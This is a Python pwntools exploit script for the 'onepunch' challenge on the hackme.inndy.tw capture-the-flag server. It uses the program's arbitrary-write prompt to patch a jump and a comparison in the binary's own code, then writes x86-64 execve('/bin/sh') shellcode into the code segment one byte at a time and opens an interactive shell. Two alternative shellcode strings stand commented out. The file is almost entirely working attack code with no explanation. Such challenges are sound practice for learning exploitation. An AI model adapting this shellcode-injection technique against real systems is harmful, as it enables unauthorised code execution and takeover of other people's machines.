#!/usr/bin/env python
# encoding: utf-8

from pwn import *
io = process('./onepunch')
io = remote('hackme.inndy.tw', 7718)
# context.log_level = 'debug'
elf = ELF('./onepunch')
tar = ''
val = ''
# sh = '\xeb\x0b\x5f\x48\x31\xd2\x52\x5e\x6a\x3b\x58\x0f\x05\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'
# sh = '\xeb\x0b\x5f\x48\x31\xd2\x48\x89\xd6\xb0\x3b\x0f\x05\xe8\xf0\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73\x68'
sh = '\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'
def hit(where, what):
    io.recvuntil('What?')
    io.sendline(where + ' ' + what)


# change jump to 0x40071d
tar = '0x400768'
val = '-76'
hit(tar, val)

# change the campare val
hit('0x400763', '-7')

# write the shellcode to 0x400773
addr = 0x400773
for i in sh:
    hit(hex(addr), str(ord(i)))
    addr += 1
    print 'over with ' + hex(ord(i))

# hit(hex(addr), '-7')
hit(tar, '10')
io.interactive()
io.close()
